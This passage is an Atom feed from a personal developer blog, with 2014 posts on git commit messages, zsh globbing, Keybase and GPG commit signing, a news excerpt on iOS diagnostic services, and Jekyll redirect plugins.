<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Yous]]></title>
  <link href="http://yous.be/atom.xml" rel="self"/>
  <link href="http://yous.be/"/>
  <updated>2014-09-15T16:22:26+09:00</updated>
  <id>http://yous.be/</id>
  <author>
    <name><![CDATA[Yous]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[How to Write a Git Commit Message &rarr;]]></title>
    <link href="http://yous.be/2014/09/03/how-to-write-a-git-commit-message/"/>
    <updated>2014-09-03T22:12:47+09:00</updated>
    <id>http://yous.be/2014/09/03/how-to-write-a-git-commit-message</id>
    <content type="html"><![CDATA[<p><a href="http://xkcd.com/1296/"><img src="http://imgs.xkcd.com/comics/git_commit.png" alt="Git Commit" /></a></p>

<blockquote><h2>The seven rules of a great git commit message</h2>

<blockquote><p>Keep in mind: <a href="http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html">This</a> <a href="http://www.git-scm.com/book/en/Distributed-Git-Contributing-to-a-Project#Commit-Guidelines">has</a> <a href="https://github.com/torvalds/subsurface/blob/master/README#L82-109">all</a> <a href="http://who-t.blogspot.co.at/2009/12/on-commit-messages.html">been</a> <a href="https://github.com/erlang/otp/wiki/writing-good-commit-messages">said</a> <a href="https://github.com/spring-projects/spring-framework/blob/30bce7/CONTRIBUTING.md#format-commit-messages">before</a>.</p></blockquote>

<ol>
<li><a href="http://chris.beams.io/posts/git-commit/#separate">Separate subject from body with a blank line</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#limit-50">Limit the subject line to 50 characters</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#capitalize">Capitalize the subject line</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#end">Do not end the subject line with a period</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#imperative">Use the imperative mood in the subject line</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#wrap-72">Wrap the body at 72 characters</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#why-not-how">Use the body to explain <em>what</em> and <em>why</em> vs. <em>how</em></a></li>
</ol>
</blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[zsh: no matches found &rarr;]]></title>
    <link href="http://yous.be/2014/08/05/zsh-no-matches-found/"/>
    <updated>2014-08-05T14:31:03+09:00</updated>
    <id>http://yous.be/2014/08/05/zsh-no-matches-found</id>
    <content type="html"><![CDATA[<p>With the use of <a href="http://www.git-scm.com">Git</a> or <a href="http://octopress.org">Octopress</a> (typically <a href="https://github.com/ruby/rake">Rake</a>), we type <code>[</code>, <code>]</code>, <code>^</code> characters to terminal:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>git reset HEAD^
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>rake install<span class="o">[</span>classic<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Some <a href="http://www.zsh.org">Zsh</a> users know what would happen when we type that commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>zsh: no matches found: HEAD^
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>zsh: no matches found: install<span class="o">[</span>classic<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is caused by Zsh:</p>

<blockquote><p>zsh allows Filename Generation and Pattern Matching (Globbing) using square brackets and other characters (explained in the <a href="http://zsh.sourceforge.net/Guide/zshguide05.html">zsh guide</a>, section 5.9).</p></blockquote>

<p>The solution is simple:</p>

<blockquote><p>The solution, found in the <a href="http://zsh.sourceforge.net/FAQ/zshfaq03.html">zsh FAQ</a> (section 3.4), is simply adding a line in ~/.zshrc that disables globbing for a single command:</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nb">alias </span><span class="nv">rake</span><span class="o">=</span><span class="s2">&quot;noglob rake&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Aliasing <code>git</code> is also useful:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nb">alias </span><span class="nv">git</span><span class="o">=</span><span class="s2">&quot;noglob git&quot;</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Undocumented iOS functions allow monitoring of personal data, expert says &rarr;]]></title>
    <link href="http://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says/"/>
    <updated>2014-07-22T22:19:14+09:00</updated>
    <id>http://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says</id>
    <content type="html"><![CDATA[<blockquote><p>&ldquo;Backdoor&rdquo; can be abused by gov&rsquo;t agents and ex-lovers to gain persistent access.</p>

<p>Apple has endowed iPhones with undocumented functions that allow unauthorized people in privileged positions to wirelessly connect and harvest pictures, text messages, and other sensitive data without entering a password or PIN, a forensic scientist warned over the weekend.</p>

<p>Zdziarski said the service that raises the most concern is known as com.apple.mobile.file_relay. It dishes out a staggering amount of data&mdash;including account data for e-mail, Twitter, iCloud, and other services, a full copy of the address book including deleted entries, the user cache folder, logs of geographic positions, and a complete dump of the user photo album&mdash;all without requiring a backup password to be entered. He said two other services dubbed com.apple.pcapd and com.apple.mobile.house_arrest may have legitimate uses for app developers or support people but can also be used to spy on users by government agencies or even jilted ex-lovers. The Pcapd service, for instance, allows people to wirelessly monitor all network traffic traveling into and out of the device, even when it&rsquo;s not running in a special developer or support mode. House_arrest, meanwhile, allows the copying of sensitive files and documents from Twitter, Facebook, and many other applications.</p>

<p><img src="http://cdn.arstechnica.net/wp-content/uploads/2014/07/pcapd1.jpg" alt="com.apple.pcapd" /></p>

<p>Slides of Zdziarski&rsquo;s talk, titled <strong>Identifying Back Doors, Attack Points, and Surveillance Mechanisms in iOS Devices</strong> are <a href="http://www.zdziarski.com/blog/wp-content/uploads/2014/07/iOS_Backdoors_Attack_Points_Surveillance_Mechanisms.pdf">here</a>.</p></blockquote>

<p>Also check the page about <a href="http://support.apple.com/kb/HT6331">iOS: About diagnostic capabilities</a> on Apple Support:</p>

<blockquote><p>Each of these diagnostic capabilities requires the user to have unlocked their device and agreed to trust another computer. Any data transmitted between the iOS device and trusted computer is encrypted with keys not shared with Apple. For users who have enabled iTunes Wi-Fi Sync on a trusted computer, these services may also be accessed wirelessly by that computer.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Using Keybase]]></title>
    <link href="http://yous.be/2014/07/18/using-keybase/"/>
    <updated>2014-07-18T03:21:09+09:00</updated>
    <id>http://yous.be/2014/07/18/using-keybase</id>
    <content type="html"><![CDATA[<h2><a id="keybase"></a>Keybase</h2>

<p><img src="https://keybase.io/images/logo.png" alt="Keybase" /></p>

<blockquote><p>Keybase will be a public directory of publicly auditable public keys. All paired, for convenience, with unique usernames.</p></blockquote>

<p>I just created my <a href="https://keybase.io">Keybase</a>. You can see my PGP public key on <a href="https://keybase.io/yous">keybase.io/yous</a> and get the key via <code>https://keybase.io/yous/key.asc</code>. Anyone can encrypt messages using my public key and then I could decrypt it using my private key and see the message with safety. All of these can be done in browser, in <a href="https://keybase.io">Keybase</a>.</p>

<h2><a id="keybase-proof"></a>Keybase Proof</h2>

<p>Keybase provides several ways to prove own identity of a Twitter account, a GitHub account, websites and a bitcoin address. Still it can be done on the browser, also you can use <a href="https://keybase.io/docs/command_line">command line</a> for it. I proved <a href="https://github.com/yous">my GitHub</a> by <a href="https://gist.github.com/yous/149b0775d2ff02eac323">keybase.md</a> and <a href="http://yous.be">this site</a> by <a href="http://yous.be/keybase.txt">keybase.txt</a>. Also you can check it with command line like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>keybase id yous
</span><span class='line'>✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
</span><span class='line'>✔ <span class="s2">&quot;yous&quot;</span> on github: https://gist.github.com/149b0775d2ff02eac323
</span><span class='line'>✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
</span></code></pre></td></tr></table></div></figure>




<!-- more -->


<h2><a id="directory-signing"></a>Directory Signing</h2>

<p>Command line program of Keybase provides <code>dir</code> command to sign or verify directory. First you should install command line, see the <a href="https://keybase.io/docs/command_line/installation">installation docs</a>. If you already have an account, just run <code>keybase login</code>. You can also signup with <code>keybase signup</code> in terminal.</p>

<p>At first, you should change directory to sign:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>~ <span class="nv">$ </span><span class="nb">cd </span>Dropbox/Public
</span><span class='line'>~/Dropbox/Public <span class="nv">$ </span>keybase dir sign
</span><span class='line'>info: Success! Wrote SIGNED.md from 224 found items
</span></code></pre></td></tr></table></div></figure>


<p>then <code>~/Dropbox/Public/SIGNED.md</code> is generated. On same directory, veryfing directory is also possible with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>~/Dropbox/Public <span class="nv">$ </span>keybase dir verify
</span><span class='line'>info: Valid signature from keybase user yous
</span><span class='line'>✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
</span><span class='line'>✔ <span class="s2">&quot;yous&quot;</span> on github: https://gist.github.com/149b0775d2ff02eac323
</span><span class='line'>✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
</span><span class='line'>info: Signed 4 minutes ago <span class="o">(</span>Fri Jul 18 2014 20:06:31 GMT+0900 <span class="o">(</span>KST<span class="o">))</span>
</span><span class='line'>info: Success! 1 signature<span class="o">(</span>s<span class="o">)</span> verified<span class="p">;</span> 224 items checked
</span></code></pre></td></tr></table></div></figure>


<h2><a id="using-custom-email"></a>Using Custom Email</h2>

<p>When you create public key on <a href="https://keybase.io">Keybase</a>, default UID has name as <code>keybase.io/&lt;username&gt;</code> and email as <code>&lt;username&gt;@keybase.io</code>. You can add UID with your real name and regular email. From <a href="http://superuser.com/questions/293184/one-gnupg-pgp-key-pair-two-emails">One GnuPG/PGP key pair, two emails?</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gpg --edit-key &lt;username&gt;@keybase.io
</span><span class='line'>gpg&gt; adduid
</span><span class='line'>Real name: &lt;name&gt;
</span><span class='line'>Email address: &lt;email&gt;
</span><span class='line'>Comment: &lt;comment or Return to none&gt;
</span><span class='line'>Change <span class="o">(</span>N<span class="o">)</span>ame, <span class="o">(</span>C<span class="o">)</span>omment, <span class="o">(</span>E<span class="o">)</span>mail or <span class="o">(</span>O<span class="o">)</span>kay/<span class="o">(</span>Q<span class="o">)</span>uit? o
</span><span class='line'>Enter passphrase: &lt;passphrase&gt;
</span><span class='line'>gpg&gt; uid &lt;uid&gt;
</span><span class='line'>gpg&gt; trust
</span><span class='line'>Your decision? 5
</span><span class='line'>Do you really want to <span class="nb">set </span>this key to ultimate trust? <span class="o">(</span>y/N<span class="o">)</span> y
</span><span class='line'>gpg&gt; save
</span></code></pre></td></tr></table></div></figure>


<h2><a id="signing-commits"></a>Signing Commits</h2>

<p>All the crypto of Keybase is performed with GPG, you can sign your tags and your commits. To setup your signing key, you need to get your key id by:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gpg --list-secret-keys <span class="p">|</span> grep <span class="s2">&quot;^sec&quot;</span>
</span><span class='line'>sec   4096R/1D5A400A 2014-07-16
</span></code></pre></td></tr></table></div></figure>


<p>The <code>1D5A400A</code> part is your key id. Then simply you can set your signing key by:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git config --global user.signingkey 1D5A400A
</span></code></pre></td></tr></table></div></figure>


<p>Also</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git config --global commit.gpgsign <span class="nb">true</span>
</span></code></pre></td></tr></table></div></figure>


<p>makes Git to sign every commits:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>mkdir tmp <span class="o">&amp;&amp;</span> <span class="nb">cd </span>tmp
</span><span class='line'><span class="nv">$ </span>git init
</span><span class='line'><span class="nv">$ </span><span class="nb">echo </span>foo &gt; foo
</span><span class='line'><span class="nv">$ </span>git add foo
</span><span class='line'><span class="nv">$ </span>git commit -m <span class="s2">&quot;Test commit of foo&quot;</span>
</span><span class='line'>
</span><span class='line'>You need a passphrase to unlock the secret key <span class="k">for</span>
</span><span class='line'>user: <span class="s2">&quot;John Doe &lt;john.doe@example.com&gt;&quot;</span>
</span><span class='line'>2048-bit RSA key, ID E79FBC2D, created 2014-07-16 <span class="o">(</span>main key ID 1D5A400A<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>master <span class="o">(</span>root-commit<span class="o">)</span> 6cdfc26<span class="o">]</span> Test commit of foo
</span><span class='line'> <span class="m">1</span> file changed, <span class="m">1</span> insertion<span class="o">(</span>+<span class="o">)</span>
</span><span class='line'> create mode <span class="m">100644</span> foo
</span></code></pre></td></tr></table></div></figure>


<p>After adding signed commits, you can see the signature of commits by using <code>--show-signature</code> option:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git log --show-signature
</span><span class='line'>commit 6cdfc26eb2273fed14181fe4a09b6240323b8930
</span><span class='line'>gpg: Signature made 금  7/18 21:29:24 <span class="m">2014</span> KST using RSA key ID E79FBC2D
</span><span class='line'>gpg: Good signature from <span class="s2">&quot;John Doe &lt;john.doe@example.com&gt;&quot;</span>
</span><span class='line'>gpg:                 aka <span class="s2">&quot;keybase.io/jdoe &lt;jdoe@keybase.io&gt;&quot;</span>
</span><span class='line'>Author: John Doe &lt;john.doe@example.com&gt;
</span><span class='line'>Date:   Fri Jul <span class="m">18</span> 21:29:14 <span class="m">2014</span> +0900
</span><span class='line'>
</span><span class='line'>    Test commit of foo
</span><span class='line'>
</span><span class='line'> foo <span class="p">|</span> <span class="m">1</span> +
</span><span class='line'> <span class="m">1</span> file changed, <span class="m">1</span> insertion<span class="o">(</span>+<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>For more information, see <a href="http://mikegerwitz.com/papers/git-horror-story">A Git Horror Story: Repository Integrity With Signed Commits</a> by Mike Gerwitz.</p>

<h2><a id="contact-me"></a>Contact Me</h2>

<p>So, now feel free to contact me via <a href="https://keybase.io/yous">keybase.io/yous</a> and other <a href="http://yous.be/about">contacts</a>. The source of this site is available on <a href="https://github.com/yous/yous.github.io">GitHub</a>, forks and pull requests are welcome!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introducing Source Han Sans: An open source Pan-CJK typeface &rarr;]]></title>
    <link href="http://yous.be/2014/07/16/introducing-source-han-sans-an-open-source-pan-cjk-typeface/"/>
    <updated>2014-07-16T16:04:27+09:00</updated>
    <id>http://yous.be/2014/07/16/introducing-source-han-sans-an-open-source-pan-cjk-typeface</id>
    <content type="html"><![CDATA[<blockquote><p>Adobe, in partnership with Google, is pleased to announce the release of <a href="http://adobe.ly/TkSHS">Source Han Sans</a>, a new open source Pan-CJK typeface family that is now available on Typekit for desktop use.</p>

<p><img src="http://typekit.files.wordpress.com/2014/07/multi-language-sample-v3.jpg?w=800&amp;h=408" alt="Multi-language sample" /></p>

<p>More information on Google&rsquo;s Noto Sans CJK family is available on their <a href="http://goo.gl/yhFcim">blog</a>.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Move to 'jekyll-redirect-from']]></title>
    <link href="http://yous.be/2014/07/09/move-to-jekyll-redirect-from/"/>
    <updated>2014-07-09T15:41:31+09:00</updated>
    <id>http://yous.be/2014/07/09/move-to-jekyll-redirect-from</id>
    <content type="html"><![CDATA[<h2><a id="problems-with-jekyll-alias-generator"></a>Problems with jekyll_alias_generator</h2>

<p>I wrote <a href="http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/">&ldquo;How to Add Redirects to Post URL on Octopress&rdquo;</a> few month ago. Now <a href="https://github.com/imathis/octopress/commit/72ea6042e33f0b92e4923c3af00e923f19472573">Octopress is compatible</a> with <a href="http://jekyllrb.com">Jekyll</a> 2.0, and some plugins don&rsquo;t seem to work. Current Octopress uses Jekyll <a href="https://github.com/imathis/octopress/blob/4fdae37e4294618084f652c99c0c06ba7663ac07/Gemfile.lock#L26">2.0.3</a> and when I run <code>rake generate</code>, I see an error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>/path/to/jekyll/lib/jekyll/static_file.rb:40:in <span class="sb">`</span>stat<span class="err">&#39;</span>: Not a directory @ rb_file_s_stat - /path/to/generated/alias/index.html/ <span class="o">(</span>Errno::ENOTDIR<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So I make <a href="https://github.com/yous/jekyll_alias_generator/commit/7de96759bdd7a2c27fa2d4d603c6c1f585fd2abc">this commit</a>:</p>

<div><script src='https://gist.github.com/30d45925d0b100052f6d.js'></script>
<noscript><pre><code>diff --git a/_plugins/alias_generator.rb b/_plugins/alias_generator.rb
index 1d24cd8..50e9404 100644
--- a/_plugins/alias_generator.rb
+++ b/_plugins/alias_generator.rb
@@ -70,9 +70,10 @@ module Jekyll
           file.write(alias_template(destination_path))
         end
 
-        (alias_index_path.split(&#39;/&#39;).size + 1).times do |sections|
+        alias_index_path.split(&#39;/&#39;).size.times do |sections|
           @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_index_path.split(&#39;/&#39;)[0, sections].join(&#39;/&#39;), &#39;&#39;)
         end
+        @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_dir, alias_file)
       end
     end
 </code></pre></noscript></div>


<p>But it seems that there is <a href="https://github.com/tsmango/jekyll_alias_generator/issues/12">another problem</a> with latest Jekyll, so I make <a href="https://github.com/yous/jekyll_alias_generator/commit/59a72029307a730014a020dcb3f73506f80ddab5">another commit</a>:</p>

<div><script src='https://gist.github.com/ceb181878cf15b529e6d.js'></script>
<noscript><pre><code>diff --git a/_plugins/alias_generator.rb b/_plugins/alias_generator.rb
index 50e9404..76102db 100644
--- a/_plugins/alias_generator.rb
+++ b/_plugins/alias_generator.rb
@@ -56,13 +56,13 @@ module Jekyll
       alias_paths.compact!
 
       alias_paths.flatten.each do |alias_path|
-        alias_path = alias_path.to_s
+        alias_path = File.join(&#39;/&#39;, alias_path.to_s)
 
         alias_dir  = File.extname(alias_path).empty? ? alias_path : File.dirname(alias_path)
         alias_file = File.extname(alias_path).empty? ? &quot;index.html&quot; : File.basename(alias_path)
 
-        fs_path_to_dir   = File.join(@site.dest, alias_dir)
-        alias_index_path = File.join(alias_dir, alias_file)
+        fs_path_to_dir = File.join(@site.dest, alias_dir)
+        alias_sections = alias_dir.split(&#39;/&#39;)[1..-1]
 
         FileUtils.mkdir_p(fs_path_to_dir)
 
@@ -70,8 +70,8 @@ module Jekyll
           file.write(alias_template(destination_path))
         end
 
-        alias_index_path.split(&#39;/&#39;).size.times do |sections|
-          @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_index_path.split(&#39;/&#39;)[0, sections].join(&#39;/&#39;), &#39;&#39;)
+        alias_sections.size.times do |sections|
+          @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_sections[0, sections + 1].join(&#39;/&#39;), &#39;&#39;)
         end
         @site.static_files &lt;&lt; Jekyll::AliasFile.new(@site, @site.dest, alias_dir, alias_file)
       end</code></pre></noscript></div>


<p>To say the result first, I had <a href="https://github.com/yous/yous.github.io/commit/2cf44cbe21b499c89dc8ac68f6f170add52f9d6e">no luck</a>. The alias directories are generated, every <code>index.html</code> file under each directory won&rsquo;t. By looking at diff of <code>sitemap.xml</code>, the plugin seems to generate wrong paths. I&rsquo;m pretty newbie to Jekyll and how Octopress works with it. Also this is a plugin for Jekyll, not Octopress. So if you have any fix for this problem, please make pull requests to <a href="https://github.com/tsmango/jekyll_alias_generator/pulls">jekyll_alias_generator</a> or just <a href="http://yous.be/about/#contact">contact me</a>.</p>

<!-- more -->


<h2><a id="jekyll-redirect-from"></a>jekyll-redirect-from</h2>

<p>While searching how to fix this problem, I found <a href="https://github.com/jekyll/jekyll-redirect-from">jekyll-redirect-from</a> served by Jekyll team. What it does is almost completely same with <code>jekyll_alias_generator</code>. Generates alias HTML files when we set <code>redirect_from</code> key in YAML front matter of the post.</p>

<p>To use this plugin, install <code>jekyll-redirect-from</code> gem by select one option from below:</p>

<ul>
<li>Add <code>gem 'jekyll-redirect-from'</code> to <code>Gemfile</code> and execute <code>bundle</code>.</li>
<li>Run <code>gem install jekyll-redirect-from</code> on terminal.</li>
</ul>


<p>Then add it to your <code>_config.yml</code>:</p>

<figure class='code'><figcaption><span>_config.yml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">gems</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">jekyll-redirect-from</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ready to add redirects! You can use this by adding <code>redirect_from</code> to the YAML front matter of your page or post:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">redirect_from</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/path/to/alias/</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/path/to/another/alias</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also specify just one url:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">redirect_from</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/path/to/alias/</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note that <code>/path/to/alias/</code> will generate a <code>/path/to/alias/index.html</code>, while <code>/path/to/alias</code> will generate a <code>/path/to/alias</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Add Redirects to Post URL on Octopress]]></title>
    <link href="http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress/"/>
    <updated>2014-05-23T14:56:44+09:00</updated>
    <id>http://yous.be/2014/05/23/how-to-add-redirects-to-post-url-on-octopress</id>
    <content type="html"><![CDATA[<p>When I write a new post on <a href="http://octopress.org">Octopress</a>, I share the link of it to somewhere doesn&rsquo;t support <a href="http://en.wikipedia.org/wiki/Hyperlink">hyperlinks</a>. Since people can&rsquo;t click the link, they should copy and paste or just type it letter by letter. I wanted to make it easier, so I maded short url for every post.</p>

<h2><a id="alias-generator-for-posts"></a>Alias Generator for Posts</h2>

<p>There is a <a href="http://jekyllrb.com">Jekyll</a> plugin that <a href="https://github.com/tsmango/jekyll_alias_generator">generates redirect pages for posts with aliases</a>. Octopress is based on Jekyll and this plugin has no compatibility problem. Its source is on GitHub, so I just added it as submodule:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git submodule add git@github.com:tsmango/jekyll_alias_generator plugins/jekyll_alias_generator
</span></code></pre></td></tr></table></div></figure>


<p>In your <code>_config.yml</code>, you may have this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">plugins</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">plugins</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then it reads <code>plugins</code> directory and <code>alias_generator.rb</code> in <code>plugins/jekyll_alias_generator/_plugins/</code> directory is also loaded, so you can use and manage it!</p>

<h2><a id="how-to-use"></a>How to Use</h2>

<p>This plugin checks <code>alias</code> inside every post&rsquo;s YAML Front Matter. Just place the path of the alias:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">---</span>
</span><span class='line'><span class="l-Scalar-Plain">layout</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">post</span>
</span><span class='line'><span class="l-Scalar-Plain">title</span><span class="p-Indicator">:</span> <span class="s">&quot;How</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Add</span><span class="nv"> </span><span class="s">Redirects</span><span class="nv"> </span><span class="s">to</span><span class="nv"> </span><span class="s">Post</span><span class="nv"> </span><span class="s">URL</span><span class="nv"> </span><span class="s">on</span><span class="nv"> </span><span class="s">Octopress&quot;</span>
</span><span class='line'><span class="l-Scalar-Plain">alias</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/p/20140523</span>
</span><span class='line'><span class="nn">---</span>
</span></code></pre></td></tr></table></div></figure>


<p>Multiple aliases are also available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">---</span>
</span><span class='line'><span class="l-Scalar-Plain">layout</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">post</span>
